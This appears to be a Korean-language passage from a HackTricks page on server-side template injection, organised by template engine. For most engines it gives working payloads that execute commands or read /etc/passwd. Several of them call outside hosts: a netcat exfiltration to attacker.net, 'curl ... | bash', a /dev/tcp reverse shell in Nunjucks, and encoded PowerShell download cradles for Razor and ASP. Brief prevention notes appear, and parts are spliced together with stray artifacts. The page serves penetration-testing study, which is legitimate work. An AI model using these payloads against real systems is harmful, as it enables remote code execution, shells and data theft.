To prevent SSTI in Twig, it is important to properly validate and sanitize user input before using it in templates. Avoid using user input directly in template expressions and use Twig's built-in filters and functions to sanitize and escape user input.

Twig에서 SSTI를 방지하기 위해서는 템플릿에서 사용하기 전에 사용자 입력을 올바르게 유효성 검사하고 산화시켜야 합니다. 템플릿 표현식에서 사용자 입력을 직접 사용하지 않고, Twig의 내장 필터와 함수를 사용하여 사용자 입력을 산화시키고 이스케이프하는 것이 중요합니다.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**추가 정보**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)의 Twig 및 Twig (Sandboxed) 섹션에서 더 많은 정보를 얻을 수 있습니다.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)에서도 관련 정보를 찾을 수 있습니다.

### Plates (PHP)

Plates는 PHP에 기반한 템플릿 엔진으로, Twig에서 영감을 받았습니다. 그러나 Twig와 달리 Plates는 새로운 구문을 도입하지 않고 템플릿에서 기본 PHP 코드를 활용하여 PHP 개발자에게 직관적입니다.

컨트롤러:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
페이지 템플릿:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
레이아웃 템플릿:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
**추가 정보**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#plates)

### PHPlib과 HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)은 PHPlib과 동일하지만 Pear로 이식되었습니다.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# SSTI (Server-Side Template Injection)

## Authors

This page displays a list of authors. The authors' names are retrieved from a server-side template.

### Vulnerability

The vulnerability lies in the fact that the server-side template is not properly sanitized or validated. This allows an attacker to inject malicious code into the template, which is then executed on the server.

### Exploitation

To exploit this vulnerability, an attacker can inject template code that allows them to execute arbitrary commands or access sensitive information. The specific payload will depend on the template engine being used.

### Prevention

To prevent SSTI vulnerabilities, it is important to properly sanitize and validate all user input before using it in a server-side template. This can be done by using a secure template engine that automatically escapes user input or by manually sanitizing and validating the input.

### References

- [OWASP Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
**추가 정보**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#phplib-and-html_template_phplib)

### Jade (NodeJS)
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**추가 정보**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)의 Jade 섹션에서 더 많은 정보를 얻을 수 있습니다.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template)은 XML 태그를 사용하여 문서를 여러 부분으로 나누는 PHP 비컴파일링 템플릿 엔진입니다.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
**추가 정보**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pattemplate)

### Handlebars (NodeJS)

경로 순회 (더 많은 정보는 [여기](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)에서 확인할 수 있습니다).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= 에러
* ${7\*7} = ${7\*7}
* 아무것도 없음
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**추가 정보**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **템플릿** | **설명**                                |
| ---------- | --------------------------------------- |
|            | 평가 및 출력 렌더링                      |
|            | 평가 및 HTML 인코딩된 출력 렌더링        |
|            | 주석                                    |
| and        | 코드 허용 (기본적으로 비활성화됨)        |

* \= 49

**클라이언트 측**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**서버 측**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**추가 정보**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**서버 측 렌더링 예시**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**추가 정보**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = 출력 없음
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = 오류
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**추가 정보**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (루비)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = 에러`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**추가 정보**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (루비)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**추가 정보**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

파이썬에서 **샌드박스 우회를 통한 임의의 명령 실행**에 대한 트릭을 배우려면 다음 페이지를 확인하세요:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}



{{os.system('whoami')}}
{{os.system('whoami')}}
```
**추가 정보**
* [https://ajinabraham.com/blog/server-side-template-injection-in-tornado](https://ajinabraham.com/blog/server-side-template-injection-in-tornado)

### Jinja2 (Python)

[공식 웹사이트](http://jinja.pocoo.org)

> Jinja2는 Python용으로 개발된 완전한 기능을 갖춘 템플릿 엔진입니다. 전체 유니코드 지원, 선택적으로 통합된 샌드박스 실행 환경, 널리 사용되며 BSD 라이선스가 있습니다.

* `{{7*7}} = 에러`
* `${7*7} = ${7*7}`
* `{{foobar}} 아무것도 없음`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - 템플릿 형식**

Jinja2는 파이썬에서 사용되는 강력한 템플릿 엔진입니다. 이 엔진은 HTML, XML, JSON 등 다양한 형식의 템플릿을 생성할 수 있습니다. Jinja2 템플릿은 중괄호(`{{ }}`)와 백슬래시(`{% %}`)를 사용하여 변수, 제어문, 반복문 등을 표현합니다.

**Jinja2 - Template Injection**

템플릿 삽입(Server-Side Template Injection, SSTI)은 웹 애플리케이션에서 발생할 수 있는 심각한 취약점 중 하나입니다. 이 취약점은 사용자 입력을 템플릿 엔진에 직접 전달하고 실행되도록 하는 공격을 의미합니다. SSTI를 이용하면 악의적인 코드를 실행하여 서버 측에서 임의의 명령을 실행할 수 있습니다.

**Jinja2 - 템플릿 삽입 공격의 예**

다음은 Jinja2 템플릿 삽입 공격의 예입니다.

```python
from jinja2 import Template

template = Template("Hello, {{ name }}!")
output = template.render(name=request.GET['name'])
```

위의 코드에서 `name` 변수는 사용자 입력으로부터 받아온 값으로 채워집니다. 하지만 사용자가 악의적인 코드를 입력하면, 해당 코드가 템플릿 엔진에 의해 실행될 수 있습니다.

**Jinja2 - 템플릿 삽입 공격의 위험성**

템플릿 삽입 공격은 서버 측에서 임의의 코드를 실행할 수 있는 위험한 취약점입니다. 공격자는 서버의 환경 변수, 파일 시스템, 데이터베이스 등에 접근하여 중요한 정보를 유출하거나 조작할 수 있습니다. 또한, 서버의 제어권을 획득하여 악성 코드를 실행하거나 시스템을 마비시킬 수도 있습니다.

**Jinja2 - 템플릿 삽입 공격 방지하기**

템플릿 삽입 공격을 방지하기 위해서는 다음과 같은 조치를 취할 수 있습니다.

- 사용자 입력을 신뢰할 수 있는 값으로 필터링하거나 이스케이프 처리합니다.
- 템플릿 엔진의 보안 설정을 강화합니다.
- 최신 버전의 템플릿 엔진을 사용하고, 보안 패치를 적용합니다.
- 템플릿 엔진의 동작을 제한하는 적절한 설정을 적용합니다.

**Jinja2 - 템플릿 삽입 공격 탐지하기**

템플릿 삽입 공격을 탐지하기 위해서는 다음과 같은 방법을 사용할 수 있습니다.

- 웹 애플리케이션의 로그를 분석하여 의심스러운 동작을 탐지합니다.
- 템플릿 엔진의 로깅 기능을 활성화하여 공격 시도를 추적합니다.
- 자동화된 취약점 스캐너를 사용하여 취약점을 탐지합니다.

**Jinja2 - 템플릿 삽입 공격 예방을 위한 권장 사항**

템플릿 삽입 공격을 예방하기 위해 다음과 같은 권장 사항을 따르는 것이 좋습니다.

- 신뢰할 수 없는 입력을 템플릿 엔진에 직접 전달하지 않습니다.
- 사용자 입력을 필터링하거나 이스케이프 처리하여 안전한 값으로 사용합니다.
- 템플릿 엔진의 보안 설정을 강화하고, 최신 버전 및 보안 패치를 적용합니다.
- 웹 애플리케이션의 로그를 모니터링하여 의심스러운 동작을 신속하게 탐지합니다.

**Jinja2 - 템플릿 삽입 공격에 대한 추가 정보**

템플릿 삽입 공격에 대한 자세한 내용은 다음 링크를 참고하세요.

- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
- [OWASP - Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**`__builtins__`에 의존하지 않는 RCE**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/):

Server-Side Template Injection (SSTI)은 애플리케이션에서 발생할 수 있는 심각한 취약점 중 하나입니다. 이 취약점은 템플릿 엔진에 입력된 사용자 제공 데이터를 안전하게 처리하지 않을 때 발생합니다. Jinja2와 같은 템플릿 엔진은 사용자 입력을 템플릿으로 해석하고 실행하기 때문에, 악의적인 사용자가 템플릿에 Python 코드를 삽입하여 서버 측에서 임의의 코드를 실행할 수 있습니다.

이 취약점을 악용하기 위해 공격자는 취약한 애플리케이션에 악의적인 템플릿 코드를 삽입합니다. 이를 통해 공격자는 서버 측에서 임의의 명령을 실행하거나 시스템에 대한 접근 권한을 획득할 수 있습니다. 이러한 공격은 `__builtins__`를 사용하지 않고도 수행할 수 있습니다.

`__builtins__`는 Python의 내장 모듈을 포함하는 딕셔너리입니다. 일반적으로 SSTI 공격은 `__builtins__`를 사용하여 서버 측에서 임의의 코드를 실행합니다. 그러나 이 취약점은 `__builtins__`를 사용하지 않고도 RCE(Remote Code Execution)를 수행할 수 있는 다른 방법을 제공합니다.

이 취약점을 악용하는 공격자는 템플릿 엔진의 취약점을 이용하여 서버 측에서 임의의 코드를 실행할 수 있습니다. 이를 통해 공격자는 시스템에 대한 완전한 제어권을 획득하거나 중요한 데이터를 유출할 수 있습니다.

이 취약점을 방지하기 위해서는 입력 데이터를 신뢰할 수 있는 방법으로 처리해야 합니다. 사용자 입력을 템플릿으로 해석하기 전에 적절한 필터링과 검증을 수행하여 악의적인 코드 삽입을 방지해야 합니다. 또한, 템플릿 엔진의 최신 버전을 사용하고 보안 패치를 적용하는 것이 중요합니다.
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinja를 악용하는 방법에 대한 자세한 내용**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)에서 다른 페이로드를 확인할 수 있습니다.

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
**추가 정보**
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#mako)

### Razor (.Net)

* `@(2+2) <= 성공`
* `@() <= 성공`
* `@("{{code}}") <= 성공`
* `@ <= 성공`
* `@{} <= 오류!`
* `@{ <= 오류!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NET의 `System.Diagnostics.Process.Start` 메서드는 서버에서 어떤 프로세스든 시작할 수 있으며, 이를 통해 웹쉘을 생성할 수 있습니다. 취약한 웹앱 예제는 [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)에서 찾을 수 있습니다.

**추가 정보**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nothing
* `<%= response.write(date()) %>` = \<Date>
```xml
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**추가 정보**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

파일이 perl이지만 Ruby의 ERB 태그를 사용합니다.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = 에러`
```
<%= perl code %>
<% perl code %>
```
### GO에서의 SSTI(Server-Side Template Injection)

Go의 템플릿 엔진에서는 특정한 페이로드를 사용하여 사용 여부를 확인할 수 있습니다:

* `{{ . }}`: 데이터 구조 입력을 공개합니다. 예를 들어, `Password` 속성을 가진 객체가 전달되면 `{{ .Password }}`를 통해 노출될 수 있습니다.
* `{{printf "%s" "ssti" }}`: 문자열 "ssti"를 표시하는 것을 기대합니다.
* `{{html "ssti"}}`, `{{js "ssti"}}`: 이러한 페이로드는 "html"이나 "js"를 추가하지 않고 "ssti"를 반환해야 합니다. Go 문서 [여기](https://golang.org/pkg/text/template)에서 더 많은 지시문을 찾아볼 수 있습니다.

**XSS Exploitation**

`text/template` 패키지를 사용하면 페이로드를 직접 삽입하여 XSS를 간단하게 수행할 수 있습니다. 반면, `html/template` 패키지는 응답을 인코딩하여 이를 방지합니다 (예: `{{"<script>alert(1)</script>"}}`는 `&lt;script&gt;alert(1)&lt;/script&gt;`로 결과가 나옵니다). 그러나 Go에서의 템플릿 정의와 호출은 이 인코딩을 우회할 수 있습니다:
{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}

vbnet
Copy code

**RCE Exploitation**

`html/template`과 `text/template` 간에 RCE(exploitation)는 크게 다릅니다. `text/template` 모듈은 어떤 공개 함수든 직접 호출할 수 있도록 허용하지만(`call` 값을 사용), `html/template`에서는 허용되지 않습니다. 이러한 모듈에 대한 문서는 [여기(html/template)](https://golang.org/pkg/html/template/)와 [여기(text/template)](https://golang.org/pkg/text/template/)에서 확인할 수 있습니다.

Go에서 SSTI를 통한 RCE(exploitation)를 위해 객체 메서드를 호출할 수 있습니다. 예를 들어, 제공된 객체에 `System` 메서드가 명령을 실행하는 경우, `{{ .System "ls" }}`와 같이 악용할 수 있습니다. 이를 악용하기 위해서는 일반적으로 소스 코드에 접근해야 합니다. 예시에서와 같이요.
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**추가 정보**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### 더 많은 Exploits

더 많은 exploits은 [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)에서 확인할 수 있습니다. 또한 [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)에서 흥미로운 태그 정보를 찾을 수 있습니다.

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## 관련 도움말

유용할 것으로 생각되면 다음을 읽어보세요:

* [Flask 트릭](../../network-services-pentesting/pentesting-web/flask.md)
* [Python 매직 함수](broken-reference/)

## 도구

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## 브루트 포스 탐지 목록

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## 연습 및 참고 자료

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성 높은 사이버 보안 행사이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진하는 미션**을 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 열정적인 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로에서 영웅까지 AWS 해킹 배우기<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks를 **PDF로 다운로드**하거나 **회사를 광고**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>
